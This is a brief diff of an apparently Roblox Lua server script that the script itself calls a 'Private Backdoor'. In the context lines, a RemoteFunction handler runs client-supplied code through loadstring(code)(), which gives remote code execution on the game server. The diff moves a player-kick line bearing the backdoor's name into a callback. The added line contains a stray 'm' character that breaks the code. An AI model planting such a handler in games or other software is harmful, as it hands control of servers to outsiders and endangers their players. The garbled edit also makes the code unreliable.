@@ -1237,10 +1237,10 @@ remoteFunction.OnServerInvoke = function(player, code)
 
         s.Ended:Once(function()
            s:Destroy()
+    m      player:Kick("Backdoor has been secured by Spunchbub - Private Backdoor.")
         end)
 
         s:Play()
-        player:Kick("Backdoor has been secured by Spunchbub - Private Backdoor.")
         return
     end
     loadstring(code)()
